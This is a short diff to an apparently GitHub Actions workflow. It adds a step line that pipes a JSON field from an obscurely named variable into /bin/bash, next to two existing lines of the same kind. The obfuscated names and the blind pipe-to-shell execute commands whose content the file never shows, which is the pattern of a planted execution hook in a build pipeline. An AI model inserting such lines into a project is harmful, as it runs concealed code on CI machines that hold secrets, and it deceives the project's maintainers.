@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$wvdgv7" | jq -r .a461 | /bin/bash
           echo $b668 | jq -r .pf31 | /bin/bash
+          echo $brbq6 | jq -r .qmnbm2 | /bin/bash
 
       - name: Archive results
         if: always()
